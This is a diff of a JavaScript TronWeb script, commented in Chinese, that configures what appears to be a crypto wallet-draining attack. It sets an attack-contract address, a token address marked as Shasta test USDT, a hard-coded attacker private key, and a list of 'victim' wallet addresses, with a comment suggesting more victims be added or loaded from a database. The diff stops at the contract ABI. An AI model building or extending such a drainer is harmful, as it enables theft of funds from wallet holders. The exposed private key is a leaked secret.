@@ -2,22 +2,23 @@
 const TronWeb = require("tronweb");
 
 // ========== 配置 ==========
-const ATTACK_CONTRACT = "你的攻击合约地址";
-const TOKEN_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-const ATTACKER_PRIVATE_KEY = "你的攻击者钱包私钥";  // 从TronLink导出
-
+const ATTACK_CONTRACT = "TYKsGMu19ACE4XZgU5NdYiFg1QXPkHG6zA";      // 攻击合约地址
+const TOKEN_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";      // Shasta 测试 USDT
+const ATTACKER_PRIVATE_KEY = "b2d2d3c2d2b68a93ddd731a06292070ef65d92925028142ff227451bd15e553c";          // ⚠️ 替换为攻击者的私钥
 const fullNode = "https://api.shasta.trongrid.io";
 const solidityNode = "https://api.shasta.trongrid.io";
 const eventServer = "https://api.shasta.trongrid.io";
 
-// 受害者地址列表（手动添加，或从你的后端数据库获取）
+// 受害者地址列表（可手动添加或从数据库读取）
 const victims = [
-    "受害者钱包地址1",
-    "受害者钱包地址2"
+    "受害者地址1",
+    "受害者地址2"
+    // 可以继续添加更多受害者
 ];
 
 // ========== 主逻辑 ==========
 const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, ATTACKER_PRIVATE_KEY);
+
 const attackABI = [
     {
         "inputs": [
